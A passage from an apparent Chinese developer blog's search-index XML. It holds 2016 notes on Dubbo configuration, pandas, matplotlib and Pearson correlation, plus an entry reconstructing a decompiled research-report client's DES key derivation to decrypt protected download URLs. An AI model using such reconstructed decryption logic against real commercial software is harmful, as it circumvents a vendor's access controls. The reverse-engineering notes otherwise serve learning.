          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netty </tag>
            
            <tag> Socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo 分布式服务框架</title>
      <link href="/2016/12/08/Dubbo%20%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6/"/>
      <url>/2016/12/08/Dubbo%20%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>整理以往的思路是一件非常美妙的过程。现在到了<code>dubbo</code>了…</p><p>dubbo满足了我对RPC调用的大部分幻想～</p><p>dubbo一般用maven管理的时候，将共同部分抽离成模块，再消费者和服务提供方都导入。比如说，协议的接口和协议中需要使用的类都是在common公共模块中。</p><p>尽量在程序中设计成为可以多开的情况，这样可以平滑地迁移版本。</p><ul><li><a href="http://dubbo.io/">dubbo.io</a></li><li><a href="http://dubbo.io/Developer+Guide-zh.htm">dubbo 开发者指南</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">DemoService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoClientAction</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DemoService demoService;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDemoService</span><span class="params">(DemoService demoService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.demoService = demoService;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> demoService.sayHello(<span class="string">&quot;world&quot;</span> + i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dubbo的配置文件，下面是停车场服务的配置文件，在ApplicationContext.xml 中import即可。一个服务即可以作为服务提供方也可以作为服务的消费方。定义的bean可以在其他Service中通过<code>@autowared</code>注入。一般来说，<code>zookeeper</code>应该配置成集群，以防单点故障，事实上，哪有那么容易死啊，最大的可能就是<code>zookeeper</code> 服务器重启，所以配置多台是最靠谱的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:dubbo</span>=<span class="string">&quot;http://code.alibabatech.com/schema/dubbo&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://code.alibabatech.com/schema/dubbo</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://code.alibabatech.com/schema/dubbo/dubbo.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:application</span> <span class="attr">name</span>=<span class="string">&quot;ParkServices&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">&quot;zookeeper://mq.660pp.net:2181&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;parkDubboService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.chinaroad.api.common.services.ParkDubboService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">timeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">retries</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">&quot;userDubboService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">interface</span>=<span class="string">&quot;com.chinaroad.api.common.services.UserDubboService&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">timeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">retries</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 用dubbo协议在20880端口暴露服务 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;-1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 声明需要暴露的服务接口 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">&quot;com.chinaroad.api.common.services.ParkInfoDubboService&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;parkInfoDubboService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;parkInfoDubboService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.chinaroad.parkservices.service.impl.ParkInfoServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
            <tag> RPC </tag>
            
            <tag> 分布式服务框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贝叶斯概率</title>
      <link href="/2016/12/08/%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%A6%82%E7%8E%87/"/>
      <url>/2016/12/08/%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%A6%82%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<p>待完善</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十分钟pandas</title>
      <link href="/2016/12/07/%E5%8D%81%E5%88%86%E9%92%9Fpandas/"/>
      <url>/2016/12/07/%E5%8D%81%E5%88%86%E9%92%9Fpandas/</url>
      
        <content type="html"><![CDATA[<p>有时候真的要沉下心来，慢慢地看就自然懂了，一味的求快反而浪费大把时间～</p><p>DataFrames 真是一个神器</p><ul><li><a href="http://pandas.pydata.org/pandas-docs/stable/index.html">英文官方文档</a></li><li><a href="http://pandas.pydata.org/pandas-docs/stable/10min.html">英文官方稳定pandas十分钟入门</a></li><li><a href="http://pda.readthedocs.io/en/latest/chp5.html">中文文档，老旧</a></li><li><a href="http://nbviewer.jupyter.org/github/phelps-sg/python-bigdata/blob/master/src/main/ipynb/pandas.ipynb">jupyter上面的一篇pandas的文章</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series(data, index=index)</span><br><span class="line">s = pd.Series(np.random.randn(<span class="number">5</span>), index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span> : <span class="number">0.</span>, <span class="string">&#x27;b&#x27;</span> : <span class="number">1.</span>, <span class="string">&#x27;c&#x27;</span> : <span class="number">2.</span>&#125;</span><br><span class="line"></span><br><span class="line">pd.Series(d)</span><br><span class="line">pd.Series(d, index=[<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">pd.Series(<span class="number">5.</span>, index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">s[<span class="number">0</span>]</span><br><span class="line">s[:<span class="number">3</span>]</span><br><span class="line">s[s &gt; s.median()]</span><br><span class="line">s[[<span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>]]</span><br><span class="line">np.exp(s)</span><br><span class="line">s[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">s[<span class="string">&#x27;a&#x27;</span>] = <span class="number">12</span></span><br><span class="line"><span class="string">&#x27;e&#x27;</span> <span class="keyword">in</span> s</span><br><span class="line"><span class="string">&#x27;f&#x27;</span> <span class="keyword">in</span> s</span><br><span class="line">s.get(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">s.get(<span class="string">&#x27;f&#x27;</span>, np.nan)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>皮尔逊相关系数</title>
      <link href="/2016/12/07/%E7%9A%AE%E5%B0%94%E9%80%8A%E7%9B%B8%E5%85%B3%E7%B3%BB%E6%95%B0/"/>
      <url>/2016/12/07/%E7%9A%AE%E5%B0%94%E9%80%8A%E7%9B%B8%E5%85%B3%E7%B3%BB%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>在统计学中，皮尔逊积矩相关系数（英语：Pearson product-moment correlation coefficient，又称作 PPMCC或PCCs[1], 文章中常用r或Pearson’s r表示）用于度量两个变量X和Y之间的相关（线性相关），其值介于 -1 与 1 之间。在自然科学领域中，该系数广泛用于度量两个变量之间的相关程度。这个相关系数也称作“皮尔森相关系数r”。</p><p>待完善<br>$$  \rho_{X,Y}&#x3D;{\mathrm{cov}(X,Y) \over \sigma_X \sigma_Y} &#x3D;{E[(X-\mu_X)(Y-\mu_Y)] \over \sigma_X\sigma_Y} $$</p><p>$$ r &#x3D; \frac{\sum\limits ^n _{i&#x3D;1}(X_i - \overline{X})(Y_i - \overline{Y})}{\sqrt{\sum\limits ^n _{i&#x3D;1}(X_i - \overline{X})^2} \sqrt{\sum\limits ^n _{i&#x3D;1}(Y_i - \overline{Y})^2}}  $$</p><p>$$ r &#x3D; \frac{1}{n-1} \sum\limits ^n _{i&#x3D;1} \left( \frac{X_i - \overline{X}}{\sigma_X} \right) \left( \frac{Y_i - \overline{Y}}{\sigma_Y} \right) $$</p><p>$$ cov(X,Y)&#x3D;\frac1{n-1}\sum_{i&#x3D;1}^n(X_i-\bar X)(Y_i-\bar Y) $$</p><p>$$ r &#x3D; \frac{cov(X,Y)}{\sqrt{var(X)} \sqrt{var(Y)}} $$ </p><p>均值：</p><p>$$ \bar X &#x3D; \frac{ \sum_{i&#x3D;1}^n X_i }{n} $$</p><p>方差：</p><p>$$ s^2 &#x3D; \frac{ \sum_{i&#x3D;1}^n (X_i - \bar X)^2 }{n - 1} $$</p><p>标准差：</p><p>$$ s &#x3D; { \sqrt{ \frac{ \sum_{i&#x3D;1}^n (X_i - \bar X)^2 } {n - 1}}} $$</p><p>要理解Pearson相关系数，首先要理解协方差（Covariance），协方差是一个反映两个随机变量相关程度的指标，如果一个变量跟随着另一个变量同时变大或者变小，那么这两个变量的协方差就是正值，反之相反，公式如下：</p><p>$$皮尔逊系数 &#x3D; \frac{x和y的协方差}{(x的标准差 * y的标准差)} $$</p><p>资料：</p><ul><li><a href="https://link.zhihu.com/?target=https://segmentfault.com/q/1010000000094674">数据挖掘 - 如何理解皮尔逊相关系数（Pearson Correlation Coefficient）</a></li><li><a href="https://zh.wikipedia.org/zh-cn/%E7%9A%AE%E5%B0%94%E9%80%8A%E7%A7%AF%E7%9F%A9%E7%9B%B8%E5%85%B3%E7%B3%BB%E6%95%B0">皮尔逊相关系数－wikipedia.org</a></li><li><a href="https://www.douban.com/note/267043565/">pearson、spearman、Kendall’s tau-b三种相关性的区别</a></li><li><a href="http://guessthecorrelation.com/">游戏，直观了解点的二维分布和相关系数大小：Guess the Correlation</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协方差矩阵</title>
      <link href="/2016/12/07/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5/"/>
      <url>/2016/12/07/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5/</url>
      
        <content type="html"><![CDATA[<p>待完善</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib作图</title>
      <link href="/2016/12/04/matplotlib%E4%BD%9C%E5%9B%BE/"/>
      <url>/2016/12/04/matplotlib%E4%BD%9C%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>matplotlib作图备忘，有些地方时间久了就变得模糊，记不清楚～～</p><ul><li><a href="http://blog.csdn.net/jasonding1354/article/details/42125555?utm_source=tuicool&utm_medium=referral">基础介绍</a></li><li><a href="http://www.cnblogs.com/nju2014/p/5620776.html">详解Matplotlib的图像各个部分</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> np.exp(-t) * np.cos(<span class="number">2</span>*np.pi*t)</span><br><span class="line"></span><br><span class="line">t1 = np.arange(<span class="number">0.0</span>, <span class="number">5.0</span>, <span class="number">0.1</span>)</span><br><span class="line">t2 = np.arange(<span class="number">0.0</span>, <span class="number">5.0</span>, <span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 211 两行一列，编号为1的位置，顺着来排</span></span><br><span class="line">plt.subplot(<span class="number">211</span>)</span><br><span class="line">plt.plot(t1, f(t1), <span class="string">&#x27;bo&#x27;</span>, t2, f(t2), <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 211 两行一列，编号为2的位置</span></span><br><span class="line">plt.subplot(<span class="number">212</span>)</span><br><span class="line"></span><br><span class="line">plt.plot(t2, np.cos(<span class="number">2</span>*np.pi*t2), <span class="string">&#x27;r--&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">mu, sigma = <span class="number">100</span>, <span class="number">15</span></span><br><span class="line">x = mu + sigma * np.random.randn(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the histogram of the data</span></span><br><span class="line">n, bins, patches = plt.hist(x, <span class="number">50</span>, normed=<span class="number">1</span>, facecolor=<span class="string">&#x27;g&#x27;</span>, alpha=<span class="number">0.75</span>)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Smarts&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Probability&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Histogram of IQ&#x27;</span>)</span><br><span class="line">plt.text(<span class="number">60</span>, <span class="number">.025</span>, <span class="string">r&#x27;$\mu=100,\ \sigma=15$&#x27;</span>)</span><br><span class="line">plt.axis([<span class="number">40</span>, <span class="number">160</span>, <span class="number">0</span>, <span class="number">0.03</span>])</span><br><span class="line">plt.grid(<span class="literal">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/assets/images/matplotlib_python_parking.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> matplotlib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS反编译某研报客户端</title>
      <link href="/2016/12/03/MacOS%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9F%90%E7%A0%94%E6%8A%A5%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
      <url>/2016/12/03/MacOS%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9F%90%E7%A0%94%E6%8A%A5%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<p>偶尔看看别人的代码，换一个角度思考，也是一种乐趣～</p><p>好好学习，人生苦短，及时行乐～</p><span id="more"></span><p><img src="/assets/images/class_decompiler_overview.png"></p><p><img src="/assets/images/class_original_fileutils.png"></p><p>这里使用 jd-gui 反编译的时候，效果不是很好，需要根据理解来还原代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convertHexString(String paramString) &#123;</span><br><span class="line">        <span class="type">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="title class_">byte</span>[paramString.length() / <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; arrayOfByte.length) &#123;</span><br><span class="line">            arrayOfByte[i] = ((<span class="type">byte</span>) Integer.parseInt(paramString.substring(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arrayOfByte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String paramString1, String paramString2)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] p1 = convertHexString(paramString1);</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">localCipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        <span class="type">DESKeySpec</span> <span class="variable">localDESKeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DESKeySpec</span>(paramString2.getBytes());</span><br><span class="line">        localCipher.init(<span class="number">2</span>, SecretKeyFactory.getInstance(<span class="string">&quot;DES&quot;</span>).generateSecret(localDESKeySpec), <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(paramString2.getBytes()));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(localCipher.doFinal(p1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getUrl</span><span class="params">(String paramString1, String paramString2, String paramString3, String paramString4)</span> &#123;</span><br><span class="line">        String[] p2 = paramString2.substring(<span class="number">10</span>).trim().split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">localStringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; p2.length) &#123;</span><br><span class="line">            localStringBuffer = localStringBuffer.append(p2[i]);</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        paramString2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!paramString3.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                ;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!paramString4.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line">            &#125;</span><br><span class="line">            paramString2 = localStringBuffer + <span class="string">&quot;W&quot;</span> + <span class="string">&quot;M&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (paramString2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                paramString1 = URLDecoder.decode(decrypt(paramString1, paramString2), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> paramString1;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            paramString2 = localStringBuffer + <span class="string">&quot;W&quot;</span> + paramString4.substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (paramString4.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                paramString2 = localStringBuffer + paramString3.substring(<span class="number">0</span>, <span class="number">1</span>) + <span class="string">&quot;M&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                paramString2 = localStringBuffer + paramString3.substring(<span class="number">0</span>, <span class="number">1</span>) + paramString4.substring(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDES</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="string">&quot;FDAEBB080873D6CF6E67B5AA6D9823......忽略&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> FileUtils.getUrl(file, <span class="string">&quot;2016-12-01 10:00:12&quot;</span>, <span class="string">&quot;547952&quot;</span>, <span class="string">&quot;6&quot;</span>);</span><br><span class="line">        System.out.println(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS反编译APK</title>
      <link href="/2016/12/02/MacOS%E5%8F%8D%E7%BC%96%E8%AF%91APK/"/>
      <url>/2016/12/02/MacOS%E5%8F%8D%E7%BC%96%E8%AF%91APK/</url>
      
